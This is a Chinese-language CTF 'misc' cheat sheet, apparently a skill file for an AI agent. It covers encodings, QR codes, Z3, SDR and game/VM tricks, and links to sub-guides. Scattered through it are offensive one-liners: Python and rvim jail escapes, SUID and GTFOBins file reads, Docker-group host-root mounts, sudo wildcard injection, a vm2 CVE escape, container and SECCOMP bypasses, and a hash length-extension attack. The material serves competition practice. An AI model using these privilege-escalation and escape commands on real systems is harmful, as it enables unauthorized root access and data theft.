# CTF杂项

CTF杂项挑战的快速参考。每种技术在这里都有一个单行代码；有关详细信息，请参阅支持文件。

## 前置条件

**Python包（所有平台）：**
```bash
pip install "pwntools==4.15.0" "segno==1.6.2" z3-solver Pillow numpy requests dnslib
```

**Linux（apt）：**
```bash
apt install libzbar0 qrencode ffmpeg
```

**macOS（Homebrew）：**
```bash
brew install ffmpeg qrencode
```

**手动安装：**
- SageMath — Linux: `apt install sagemath`, macOS: `brew install --cask sage`

## 额外资源

- [pyjails.md](pyjails.md) - Python监狱/沙盒逃逸技术，quine上下文检测，受限字符循环节分解，func_globals模块链遍历，受限字符集数字生成，类属性持久化，f-string配置注入通过存储的eval
- [bashjails.md](bashjails.md) - Bash监狱/受限shell逃逸技术，HISTFILE文件读取技巧，bash -v详细模式，ctypes.sh直接调用C库
- [encodings.md](encodings.md) - 编码，二维码，esolangs，UTF-16技巧，BCD编码，多层自动解码，索引目录二维码重组，多阶段URL编码链
- [encodings-advanced.md](encodings-advanced.md) - Verilog/HDL，格雷码循环编码，RTF自定义标签提取，SMS PDU解码，多编码顺序求解器，UTF-9，像素二进制编码，十六进制数独+QR组装，TOPKEK，MaxiCode
- [rf-sdr.md](rf-sdr.md) - RF/SDR/IQ信号处理（QAM-16，载波恢复，时序同步）
- [dns.md](dns.md) - DNS利用（ECS欺骗，NSEC遍历，IXFR，重绑定，隧道）
- [games-and-vms.md](games-and-vms.md) - WASM修补，Roblox地方文件反汇编，PyInstaller，marshal分析，Python环境RCE，Z3（包括布尔逻辑门网络SAT求解），K8s RBAC，浮点精度利用，通过Python MRO链自定义汇编语言沙盒逃逸
- [games-and-vms-2.md](games-and-vms-2.md) - Cookie检查点游戏暴力破解，Flask cookie游戏状态泄露，WebSocket游戏操作，服务器时间仅验证绕过，De Bruijn序列，Brainfuck instrumentation，WASM线性内存操作
- [games-and-vms-3.md](games-and-vms-3.md) - memfd_create打包二进制文件，多阶段加密游戏与HMAC承诺-揭示和GF(256) Nim，模拟器ROM切换状态保留，Python marshal代码注入，Benford's Law绕过，并行连接预言机中继，非ogram求解器管道，100名囚犯问题，通过emoji标识符C代码监狱逃逸，BuildKit守护程序构建秘密利用，Docker容器逃逸，Levenshtein距离预言机攻击，通过类型强制绕过污点分析，撕碎文件像素边缘重组
- [games-and-vms-4.md](games-and-vms-4.md) - 第4部分（2018年时代）：XSLT作为图灵完备的虚拟机，JavaScript MAX_SAFE_INTEGER后继等式，比较仅DSL中的二分搜索预言机，通过脚本引擎超时错误进行盲SQLi，OEIS序列查找自动化，从格式字符串约束中重新组装QR码，矩阵指数化用于Fibonacci递归，Tribonacci用于青蛙跳跃计数，Selenium + Tesseract动态CAPTCHA，Brainfuck→Piet多层多语言，bytebeat合成代码识别
- [linux-privesc.md](linux-privesc.md) - Sudo通配符参数注入（fnmatch），定制的pcap用于sudoers.d，monit confcheck进程注入，Apache -d覆盖，备份cron作业SUID，PostgreSQL COPY TO PROGRAM RCE，PostgreSQL备份凭证提取，NFS共享利用，SSH Unix套接字隧道，PaperCut Print Deploy权限提升，Squid代理转向，Zabbix管理员密码重置通过MySQL，WinSSHTerm凭证解密
- [ctfd-navigation.md](ctfd-navigation.md) - CTFd平台API导航无需浏览器：检测，令牌认证，挑战列表，文件下载，旗帜提交，计分板，提示，通知，Python客户端类

---

## 何时转向

- 如果谜题实际上以密码学或数论为中心，请切换到`/ctf-crypto`。
- 如果挑战是一个真实的二进制漏洞而不是监狱，玩具虚拟机或编码问题，请切换到`/ctf-pwn`或`/ctf-reverse`。
- 如果输入主要是文件，图像，音频或数据包捕获需要首先进行恢复工作，请切换到`/ctf-forensics`。
- 对于机器学习/人工智能技术（模型攻击，对抗性示例，LLM监狱突破），请参阅`/ctf-ai-ml`。
- 如果NodeJS沙盒使用**vm2**（`npm ls vm2`），请通过`Promise[@@species]`与`nesting:true`检查**CVE-2023-37466**——异常处理程序逃逸上下文；请参阅`ctf-web/js-sandbox`以获取完整的利用链。在杂项挑战中捆绑了JS时，始终运行`npm ls vm2`以检测易受攻击的vm2，然后再尝试其他逃逸。

## 快速启动命令

```bash
# 文件识别
file mystery_file
xxd mystery_file | head -5
python3 -c "import magic; print(magic.from_file('mystery_file'))"

# 编码检测
python3 -c "import base64; print(base64.b64decode('<data>'))"
echo '<data>' | base64 -d
echo '<hex>' | xxd -r -p

# QR码
zbarimg qr.png
python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('qr.png')))"

# Z3约束求解
python3 -c "from z3 import *; x=BitVec('x',32); s=Solver(); s.add(x^0xdead==0xbeef); s.check(); print(s.model())"

# Python监狱测试
python3 -c "__import__('os').system('id')"
```

## 一般技巧

- 仔细阅读所有提供的文件
- 检查文件元数据，隐藏内容，编码
- Power Automate脚本可能会隐藏API调用
- 当猜测多个答案时使用二分搜索

## 常见编码

```bash
# Base64
echo "encoded" | base64 -d

# Base32 (A-Z2-7=)
echo "OBUWG32D..." | base32 -d

# 十六进制
echo "68656c6c6f" | xxd -r -p

# ROT13
echo "uryyb" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

**通过字符集识别：**
- Base64: `A-Za-z0-9+/=`
- Base32: `A-Z2-7=`（无小写）
- 十六进制: `0-9a-fA-F`

有关凯撒暴力破解，URL编码和完整详细信息的说明，请参阅[encodings.md](encodings.md)。

## IEEE-754浮点编码（数据隐藏）

**模式（浮点）：** 数字是隐藏原始字节的float32值。

**关键洞察：** 一个32位浮点数只是4个字节解释为数字。重新解释为原始字节 -> ASCII。

```python
import struct
floats = [1.234e5, -3.456e-7, ...]  # 挑战中给出的任何内容
flag = b''
for f in floats:
    flag += struct.pack('>f', f)
print(flag.decode())
```

**变体：** 双`'>d'`，小端`'<f'`，混合。有关CyberChef配方，请参阅[encodings.md](encodings.md)。

## USB鼠标PCAP重建

**模式（hunt and peck）：** USB HID鼠标流量捕获屏幕键盘输入。使用USB-Mouse-Pcap-Visualizer，提取点击坐标（下降边缘），累积相对差值以获取绝对位置，覆盖OSK图像。

## 文件类型检测

```bash
file unknown_file
xxd unknown_file | head
binwalk unknown_file
```

## 存档提取

```bash
7z x archive.7z           # 通用
tar -xzf archive.tar.gz   # Gzip
tar -xjf archive.tar.bz2  # Bzip2
tar -xJf archive.tar.xz   # XZ
```

### 嵌套存档脚本
```bash
while f=$(ls *.tar* *.gz *.bz2 *.xz *.zip *.7z 2>/dev/null|head -1) && [ -n "$f" ]; do
    7z x -y "$f" && rm "$f"
done
```

## QR码

```bash
zbarimg qrcode.png       # 解码
qrencode -o out.png "data"
```

**MaxiCode条形码：** 六边形2D条形码，中心有靶心；使用`zxing`（Java）解码，因为标准QR解码器失败。请参阅[encodings-advanced.md](encodings-advanced.md#maxicode-2d-barcode-decoding-csaw-ctf-2016)。

**TOPKEK编码：** CTF特定的二进制编码，其中`KEK=0`，`TOP=1`，`!`后缀=重复计数。请参阅[encodings-advanced.md](encodings-advanced.md#topkek-binary-encoding-hack-the-vote-2016)。

请参阅[encodings.md](encodings.md)以获取QR结构，修复技术，块重组（结构和索引目录变体）和多阶段URL编码链。

## 音频挑战

```bash
sox audio.wav -n spectrogram  # 视觉数据
qsstv                          # SSTV解码器
```

## RF / SDR / IQ信号处理

有关完整详细信息，请参阅[rf-sdr.md](rf-sdr.md)（IQ格式，QAM-16解调，载波/时序恢复）。

**快速参考：**
- **cf32**: `np.fromfile(path, dtype=np.complex64)` | **cs16**: int16 reshape(-1,2) | **cu8**: RTL-SDR原始
- 星座图中的圆圈 = 恒定频率偏移；螺旋 = 漂移频率+增益不稳定性
- 4倍模糊在DD载波恢复中 - 尝试0/90/180/270旋转

## pwntools交互

```python
from pwn import *

r = remote('host', port)
r.recvuntil(b'prompt: ')
r.sendline(b'answer')
r.interactive()
```

## Python监狱快速参考

- **预言机模式：** `L()` = 长度，`Q(i,x)` = 比较，`S(guess)` = 提交。线性或二分搜索。
- **Walrus绕过：** `(abcdef := "new_chars")`重新分配约束变量
- **装饰器绕过：** `@__import__` + `@func.__class__.__dict__[__name__.__name__].__get__`用于无调用，无引号逃逸
- **字符串连接：** `open(''.join(['fl','ag.txt'])).read()`当`+`被阻止时

请参阅[pyjails.md](pyjails.md)以获取完整技术。

## Z3 / 约束求解

```python
from z3 import *
flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
# 添加约束，检查sat，提取模型
```

请参阅[games-and-vms.md](games-and-vms.md)以获取YARA规则，类型系统作为约束，布尔逻辑门网络SAT求解。

## 哈希识别

MD5: `0x67452301` | SHA-256: `0x6a09e667` | MurmurHash64A: `0xC6A4A7935BD1E995`

## SHA-256长度扩展攻击

MAC = `SHA-256(SECRET || msg)`具有已知msg/哈希 -> 通过`hlextend`伪造有效MAC。易受攻击的：SHA-256，MD5，SHA-1。不：HMAC，SHA-3。

```python
import hlextend
sha = hlextend.new('sha256')
new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
```

## 技术快速参考

- **PyInstaller：** `pyinstxtractor.py packed.exe`。请参阅[games-and-vms.md](games-and-vms.md)以获取指令集重映射。
- **Marshal：** `marshal.load(f)`然后`dis.dis(code)`。请参阅[games-and-vms.md](games-and-vms.md)。
- **Python环境RCE：** `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER="cmd"`。请参阅[games-and-vms.md](games-and-vms.md)。
- **WASM修补：** `wasm2wat` -> 翻转minimax -> `wat2wasm`。请参阅[games-and-vms.md](games-and-vms.md)。
- **浮点精度：** 大型乘数放大FP误差为可利用的分数。请参阅[games-and-vms.md](games-and-vms.md)。
- **K8s RBAC绕过：** SA令牌 -> 伪装 -> hostPath挂载 -> 读取密钥。请参阅[games-and-vms.md](games-and-vms.md)。
- **Cookie检查点：** 在猜测之前保存会话cookie，在失败时恢复以进行无重置的暴力破解。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **Flask cookie游戏状态：** `flask-unsign -d -c '<cookie>'`解码未签名的Flask会话，泄露游戏答案。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **WebSocket传送：** 修改`player.x`/`player.y`在控制台中，调用验证函数。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **仅时间验证：** 开始会话，`time.sleep(required_seconds)`，提交胜利。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **Quine上下文检测：** 具有双重用途的quine，它打印自身（通过验证）并在服务器进程中仅通过globals门运行有效载荷。请参阅[pyjails.md](pyjails.md)。
- **循环节分解：** 将目标整数分解为循环节（1，11，111，...）仅使用2个字符（`1`和`+`）进行受限评估。请参阅[pyjails.md](pyjails.md)。
- **De Bruijn序列：** B(k, n)包含所有k^n可能n长度字符串作为子字符串；通过附加前n-1个字符进行线性化。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **Brainfuck instrumentation：** 修补BF解释器以跟踪磁带单元，通过验证单元逐字符暴力破解标志字符。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **WASM内存操作：** 在运行时修补WASM线性内存以直接设置游戏状态变量，绕过游戏逻辑。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **Lua沙盒逃逸：** 绕过`load()`/`os.execute()`过滤器通过`os["execute"]`表索引或`loadstring`别名。请参阅[games-and-vms.md](games-and-vms.md#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016)。
- **通过emoji + gadget嵌入的C代码监狱逃逸：** 当仅允许emoji和标点符号在C中时，使用`(😃==😃)`作为常量1，构建整数，在`add eax, imm32`常量中嵌入gadgets，跳转到偏移+1以获取shellcode原语。请参阅[games-and-vms-3.md](games-and-vms-3.md#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026)。
- **模拟器ROM切换：** `/load`替换ROM但保留CPU状态（寄存器，RAM，PC）。在特定PC切换ROM以将一个ROM的INIT与另一个ROM的显示指令组合→读取受保护的内存。请参阅[games-and-vms-3.md](games-and-vms-3.md#emulator-rom-switching-state-preservation-bsidessf-2026)。
- **BuildKit守护程序利用：** 暴露的BuildKit gRPC允许嵌套`buildctl build`使用`--mount=type=secret`读取构建密钥。两阶段Dockerfile：安装buildctl → 提交嵌套构建挂载标志密钥。请参阅[games-and-vms-3.md](games-and-vms-3.md#buildkit-daemon-exploitation-for-build-secrets-bsidessf-2026)。
- **Docker容器逃逸：** 通过主机设备挂载的特权突破，docker.sock套接字逃逸，CAP_SYS_ADMIN cgroup release_agent，容器信息泄露通过/proc和overlayfs。请参阅[games-and-vms-3.md](games-and-vms-3.md#docker-container-escape-techniques).
- **通过类型强制绕过污点分析：** 在具有保密/污点系统的自定义机器语言类语言中，如果if表达式保密取决于返回类型而不是条件——强制副作用函数为私有类型以通过公共可变引用泄露私有数据。请参阅[games-and-vms-3.md](games-and-vms-3.md#taint-analysis-bypass-in-custom-language-via-type-coercion-plaidctf-2018).
- **撕碎文件像素边缘重组：** 将每个带的左右边缘编码为二进制掩码（暗=1），使用XOR + popcount Hamming距离贪婪放置带条，以最小边缘距离进行亚秒级重组。请参阅[games-and-vms-3.md](games-and-vms-3.md#shredded-document-pixel-edge-reassembly-under-time-pressure-nuit-du-hack-ctf-2018).
- **通过存储的eval进行f-string配置注入：** 将有效载荷存储为配置值，创建名为`eval(stored_key)`的键——f-string渲染评估键名表达式，触发RCE。请参阅[pyjails.md](pyjails.md#python-f-string-config-injection-via-stored-eval-inshack-2018).
- **十六进制数独+QR组装：** 4个QR码编码16x16十六进制数独象限；解决网格，读取对角线作为十六进制对→ASCII标志。请参阅[encodings-advanced.md](encodings-advanced.md#hexadecimal-sudoku--qr-assembly-bsidessf-2026).
- **Z3布尔门网络SAT求解：** 产品密钥验证为250个布尔门（AND/OR/XOR/NOT）在125个输入位上。将每个门建模为Z3约束，要求所有输出为True，毫秒内求解。请参阅[games-and-vms.md](games-and-vms.md#z3-sat-solving-for-boolean-logic-gate-networks-bsidessf-2026).

## 3D打印机视频喷嘴跟踪（LACTF 2026）

**模式（flag-irl）：** 3D打印机制造铭牌的视频。标志是打印的文本。

**技术：** 从视频帧中跟踪喷嘴X/Y位置，过滤打印移动（顶部/文本层仅），绘制2D直方图以揭示字母形状：
```python
# 1. 确定文本层帧（例如，帧26100-28350）
# 2. 跟踪打印头X位置（物理X轴）
# 3. 跟踪床X位置（从相机角度的物理Y轴）
# 4. 过滤具有挤出移动的条带（打印时打印头移动）
# 5. 绘制为2D散点/直方图 -> 字母出现
```

## Discord API枚举（0xFun 2026）

标志隐藏在Discord元数据中（角色，动画表情符号，嵌入）。调用`/ctf-osint`以获取Discord API枚举技术和代码（请参阅social-media.md在ctf-osint中）。

---

## SUID二进制漏洞利用（0xFun 2026）

```bash
# 查找SUID二进制文件
find / -perm -4000 2>/dev/null

# 与GTFObins交叉引用
# xxd与SUID: xxd flag.txt | xxd -r
# vim与SUID: vim -c ':!cat /flag.txt'
```

**参考：** https://gtfobins.github.io/

---

## Linux权限提升快速检查

```bash
# GECOS字段密码
cat /etc/passwd  # 检查第5个冒号分隔的字段

# ACL权限
getfacl /path/to/restricted/file

# Sudo权限
sudo -l

# Docker组成员资格（即时root）
id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

## Docker组权限提升（H7CTF 2025）

Docker组中的用户可以挂载主机文件系统到容器中并chroot到其中以获取root访问权限。

```bash
# 检查组成员资格
id  # 查找"docker"在组中

# 挂载主机根文件系统并chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh

# 现在在主机文件系统上以root身份运行
cat /root/flag.txt
```

**关键洞察：** Docker组成员资格等同于root访问。`/var/run/docker.sock`允许创建特权容器，这些容器挂载整个主机文件系统。

**参考：** https://gtfobins.github.io/gtfobins/docker/

## Sudo通配符参数注入（Dump HTB）

Sudo的`fnmatch()`跨参数边界匹配`*`。注入额外标志（`-Z root`，`-r`，第二个`-w`）到锁定命令中。构建包含嵌入式有效sudoers条目的pcap，sudo的解析器从二进制垃圾中恢复，与cron的严格解析器不同。请参阅[linux-privesc.md](linux-privesc.md#sudo-wildcard-parameter-injection-via-fnmatch-dump-htb).

## Monit进程命令行注入（Zero HTB）

读取文件而无需cat/less/head：`HISTFILE=/flag /bin/bash && history`，或者`bash -v flag.txt`（详细模式打印行），或者`ctypes.sh` `dlcall`用于直接调用C库。请参阅[bashjails.md](bashjails.md#histfile-trick-for-restricted-shell-file-reads-bctf-2016).

## Levenshtein距离预言机攻击（SunshineCTF 2016）

预言机返回猜测与秘密之间的编辑距离。从空字符串确定长度，通过单字符重复识别存在字符，二分搜索位置。O(n log n)查询。请参阅[games-and-vms-3.md](games-and-vms-3.md#levenshtein-distance-oracle-attack-sunshinectf-2016).

## SECCOMP高位文件描述符绕过（33C3 CTF 2016）

`close(0x8000000000000002)`通过SECCOMP检查（≠ 2）但内核截断为32位（== 2），关闭文件描述符2。下一个`open()`返回任意文件的文件描述符2。类型宽度不匹配BPF过滤器与内核。请参阅[games-and-vms-3.md](games-and-vms-3.md#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016).

## rvim监狱逃逸通过Python3（BKP 2017）

`rvim`阻止`:!`但`:python3 import os; os.system("cmd")`执行任意命令。检查`:version`以获取`+python3`/`+lua`/`+ruby`。请参阅[games-and-vms-3.md](games-and-vms-3.md#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017).
